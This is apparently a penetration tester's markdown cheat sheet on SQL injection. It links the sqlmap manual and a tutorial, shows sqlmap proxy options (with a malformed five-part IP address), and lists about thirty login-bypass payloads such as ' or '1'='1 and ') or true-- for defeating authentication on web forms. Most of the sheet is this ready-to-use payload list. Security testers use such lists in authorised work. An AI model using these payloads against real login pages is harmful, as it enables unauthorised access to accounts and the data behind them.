# SQL-injections


## SQLmap

Sqlmap is a great tool to perform sqlinjections.
Here is the manual.
https://github.com/sqlmapproject/sqlmap/wiki/Usage

### Use proxy

```
--proxy="http://192.2.2.2.2:1111"
```

**Proxy credencials**
```
--proxy-cred="username:password"
```


Here is a tutorial on how to make sql-injections with post-requests.

https://hackertarget.com/sqlmap-post-request-injection/


## Login bypass



This is the most classic, standard first test:
```
' or '1'='1
```

Then you have:

```
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
```




## References